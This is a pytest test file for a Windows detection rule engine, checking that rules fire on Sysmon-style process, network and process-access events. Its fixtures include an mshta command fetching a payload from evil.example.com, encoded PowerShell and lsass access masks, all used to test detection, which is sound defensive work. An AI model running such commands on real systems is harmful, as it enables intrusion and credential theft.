"""Tests for the RuleEngine: loading, evaluation, operator correctness."""

from __future__ import annotations

from pathlib import Path

import pytest
from normalizer.models import NetworkConnectEvent, OpenProcessEvent, ProcessCreateEvent
from rules.engine import (
    RuleEngine,
    _op_ends_with_any,
    _op_not_contains_any,
    _op_not_ends_with_any,
)


def _make_process_event(**kwargs) -> ProcessCreateEvent:
    """Create a ProcessCreateEvent with sensible defaults, overriding with kwargs.

    Args:
        **kwargs: Any ProcessCreateEvent field to override.

    Returns:
        A ProcessCreateEvent instance for use in engine tests.
    """
    defaults: dict = {
        "event_id": 1,
        "utc_time": "2026-06-22 10:00:00.000",
        "computer": "TEST-HOST",
        "process_guid": "{test-guid}",
        "process_id": 1234,
        "image": "C:\\Windows\\System32\\cmd.exe",
        "command_line": "cmd.exe",
        "current_directory": "C:\\",
        "user": "TEST-HOST\\User",
        "parent_process_id": 5678,
        "parent_image": "C:\\Windows\\explorer.exe",
        "parent_command_line": "explorer.exe",
        "integrity_level": "Medium",
        "hashes": None,
    }
    defaults.update(kwargs)
    return ProcessCreateEvent(**defaults)


def _make_network_event(**kwargs) -> NetworkConnectEvent:
    """Create a NetworkConnectEvent with sensible defaults.

    Args:
        **kwargs: Any NetworkConnectEvent field to override.

    Returns:
        A NetworkConnectEvent instance for use in engine tests.
    """
    defaults: dict = {
        "event_id": 3,
        "utc_time": "2026-06-22 10:00:00.000",
        "computer": "TEST-HOST",
        "process_guid": "{net-guid}",
        "process_id": 2345,
        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "user": "TEST-HOST\\User",
        "protocol": "tcp",
        "initiated": True,
        "source_ip": "192.168.1.100",
        "source_port": 54321,
        "destination_ip": "93.184.216.34",
        "destination_hostname": "example.com",
        "destination_port": 443,
    }
    defaults.update(kwargs)
    return NetworkConnectEvent(**defaults)


def _make_open_process_event(**kwargs) -> OpenProcessEvent:
    """Create an OpenProcessEvent with sensible defaults.

    Args:
        **kwargs: Any OpenProcessEvent field to override.

    Returns:
        An OpenProcessEvent instance for use in engine tests.
    """
    defaults: dict = {
        "event_id": 10,
        "utc_time": "2026-06-22 10:00:00.000",
        "computer": "TEST-HOST",
        "source_process_id": 1234,
        "source_image": "C:\\Windows\\System32\\cmd.exe",
        "target_process_id": 500,
        "target_image": "C:\\Windows\\System32\\lsass.exe",
        "granted_access": "0x1410",
        "call_trace": None,
    }
    defaults.update(kwargs)
    return OpenProcessEvent(**defaults)


@pytest.fixture(scope="module")
def engine() -> RuleEngine:
    """Shared RuleEngine instance loaded once per test module."""
    eng = RuleEngine(Path("rules"))
    eng.load()
    return eng


def test_rule_ps_encoded_cmd_fires(engine: RuleEngine):
    """PS_ENCODED_CMD_001 fires when PowerShell uses -EncodedCommand."""
    event = _make_process_event(
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe -EncodedCommand JABzAD0A...",
    )
    hits = engine.evaluate(event)
    hit_ids = [h.rule_id for h in hits]
    assert "PS_ENCODED_CMD_001" in hit_ids


def test_rule_ps_encoded_cmd_does_not_fire_on_benign(engine: RuleEngine):
    """PS_ENCODED_CMD_001 does NOT fire on benign PowerShell without encoded arg."""
    event = _make_process_event(
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe Get-Process",
    )
    hits = engine.evaluate(event)
    assert not any(h.rule_id == "PS_ENCODED_CMD_001" for h in hits)


def test_rule_office_powershell_chain_fires(engine: RuleEngine):
    """CHAIN_OFFICE_POWERSHELL_001 fires when Word spawns PowerShell."""
    event = _make_process_event(
        parent_image="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe -nop",
    )
    hits = engine.evaluate(event)
    assert any(h.rule_id == "CHAIN_OFFICE_POWERSHELL_001" for h in hits)


def test_no_hits_on_benign_notepad(engine: RuleEngine):
    """Completely benign notepad.exe process produces no rule hits."""
    event = _make_process_event(
        image="C:\\Windows\\System32\\notepad.exe",
        command_line="notepad.exe",
        parent_image="C:\\Windows\\explorer.exe",
    )
    hits = engine.evaluate(event)
    assert hits == []


def test_none_field_does_not_crash(engine: RuleEngine):
    """None field value returns False without raising an exception."""
    event = _make_process_event(command_line=None)
    hits = engine.evaluate(event)
    assert isinstance(hits, list)


def test_rule_hit_contains_mitre_metadata(engine: RuleEngine):
    """RuleHit carries correct ATT&CK metadata from the matched rule."""
    event = _make_process_event(
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe -enc JABzAD0A...",
    )
    hits = engine.evaluate(event)
    ps_hit = next(h for h in hits if h.rule_id == "PS_ENCODED_CMD_001")
    assert ps_hit.mitre_technique == "T1059.001"
    assert ps_hit.mitre_tactic == "Execution"
    assert ps_hit.severity == "High"


def test_case_insensitive_image_matching(engine: RuleEngine):
    """Uppercase image path still triggers case-insensitive ends_with match."""
    event = _make_process_event(
        image="C:\\WINDOWS\\SYSTEM32\\WINDOWSPOWERSHELL\\V1.0\\POWERSHELL.EXE",
        command_line="POWERSHELL.EXE -EncodedCommand JABzAD0A...",
    )
    hits = engine.evaluate(event)
    assert any(h.rule_id == "PS_ENCODED_CMD_001" for h in hits)


def test_engine_rule_count(engine: RuleEngine):
    """RuleEngine.rule_count equals 51 after Category A network rule addition."""
    assert engine.rule_count == 51


def test_rule_hit_is_frozen_dataclass(engine: RuleEngine):
    """RuleHit instances are frozen and cannot be mutated."""
    event = _make_process_event(
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe -enc JABzAD0A...",
    )
    hits = engine.evaluate(event)
    assert len(hits) > 0
    with pytest.raises((AttributeError, TypeError)):
        hits[0].rule_id = "TAMPERED"  # type: ignore[misc]


def test_rule_hit_suspected_families_empty(engine: RuleEngine):
    """RuleHit.suspected_families is always empty in Phase 2A."""
    event = _make_process_event(
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe -enc JABzAD0A...",
    )
    hits = engine.evaluate(event)
    for hit in hits:
        assert hit.suspected_families == ()


def test_network_powershell_http_rule_fires(engine: RuleEngine):
    """NET_POWERSHELL_HTTP_001 fires on outbound PowerShell HTTPS connection."""
    event = _make_network_event(destination_port=443, initiated=True)
    hits = engine.evaluate(event)
    assert any(h.rule_id == "NET_POWERSHELL_HTTP_001" for h in hits)


def test_network_powershell_http_rule_does_not_fire_inbound(engine: RuleEngine):
    """NET_POWERSHELL_HTTP_001 does NOT fire on inbound connections."""
    event = _make_network_event(destination_port=443, initiated=False)
    hits = engine.evaluate(event)
    assert not any(h.rule_id == "NET_POWERSHELL_HTTP_001" for h in hits)


def test_open_process_suspicious_access_fires(engine: RuleEngine):
    """API_OPEN_PROCESS_SUSPICIOUS_ACCESS_001 fires on access mask 0x1410."""
    event = _make_open_process_event(granted_access="0x1410")
    hits = engine.evaluate(event)
    assert any(h.rule_id == "API_OPEN_PROCESS_SUSPICIOUS_ACCESS_001" for h in hits)


def test_open_process_benign_access_does_not_fire(engine: RuleEngine):
    """API_OPEN_PROCESS_SUSPICIOUS_ACCESS_001 does NOT fire on benign access mask."""
    event = _make_open_process_event(granted_access="0x0400")
    hits = engine.evaluate(event)
    assert not any(h.rule_id == "API_OPEN_PROCESS_SUSPICIOUS_ACCESS_001" for h in hits)


def test_engine_rules_property_returns_copy(engine: RuleEngine):
    """engine.rules returns a list copy — mutating it does not affect the engine."""
    rules_copy = engine.rules
    original_count = engine.rule_count
    rules_copy.clear()
    assert engine.rule_count == original_count


def test_evaluate_event_with_unknown_event_id_returns_empty(engine: RuleEngine):
    """An event with an event_id not covered by any rule returns an empty hit list."""
    event = _make_process_event(event_id=99)
    hits = engine.evaluate(event)
    assert hits == []


def test_lolbin_mshta_rule_fires(engine: RuleEngine):
    """LOLBIN_MSHTA_001 fires on mshta.exe execution."""
    event = _make_process_event(
        image="C:\\Windows\\System32\\mshta.exe",
        command_line="mshta.exe http://evil.example.com/payload.hta",
    )
    hits = engine.evaluate(event)
    assert any(h.rule_id == "LOLBIN_MSHTA_001" for h in hits)


def test_script_host_cmd_chain_fires(engine: RuleEngine):
    """CHAIN_SCRIPT_HOST_CMD_001 fires when cscript.exe spawns cmd.exe."""
    event = _make_process_event(
        parent_image="C:\\Windows\\System32\\cscript.exe",
        image="C:\\Windows\\System32\\cmd.exe",
        command_line="cmd.exe /c whoami",
    )
    hits = engine.evaluate(event)
    assert any(h.rule_id == "CHAIN_SCRIPT_HOST_CMD_001" for h in hits)


# ---------------------------------------------------------------------------
# Multi-value operator unit tests (Phase 2B)
# ---------------------------------------------------------------------------


class TestEndsWithAnyOperator:
    def test_matches_single_suffix(self):
        assert _op_ends_with_any(r"c:\windows\system32\lsass.exe", ("lsass.exe",))

    def test_matches_any_in_list(self):
        assert _op_ends_with_any(
            r"c:\windows\system32\winlogon.exe",
            ("lsass.exe", "winlogon.exe", "csrss.exe"),
        )

    def test_case_insensitive_suffix(self):
        assert _op_ends_with_any(
            r"c:\windows\system32\lsass.exe",
            ("LSASS.EXE",),
        )

    def test_no_match(self):
        assert not _op_ends_with_any(
            r"c:\program files\edge\msedge.exe",
            ("lsass.exe", "winlogon.exe", "csrss.exe"),
        )


class TestNotEndsWithAnyOperator:
    def test_excluded_suffix_returns_false(self):
        assert not _op_not_ends_with_any(
            r"c:\program files\windows defender\msmpeng.exe",
            ("MsMpEng.exe", "csrss.exe"),
        )

    def test_non_excluded_suffix_returns_true(self):
        assert _op_not_ends_with_any(
            r"c:\windows\system32\powershell.exe",
            ("MsMpEng.exe", "csrss.exe", "lsass.exe"),
        )

    def test_case_insensitive_exclusion(self):
        assert not _op_not_ends_with_any(
            r"c:\windows\system32\wininit.exe",
            ("wininit.exe",),
        )


class TestNotContainsAnyOperator:
    def test_excluded_substring_returns_false(self):
        assert not _op_not_contains_any(
            "c:\\windows\\system32\\werfault.exe",
            ("werfault.exe", "csrss.exe"),
        )

    def test_no_excluded_substring_returns_true(self):
        assert _op_not_contains_any(
            "c:\\windows\\system32\\powershell.exe",
            ("werfault.exe", "csrss.exe"),
        )

    def test_case_insensitive_exclusion(self):
        assert not _op_not_contains_any(
            "c:\\windows\\system32\\csrss.exe",
            ("CSRSS.EXE",),
        )
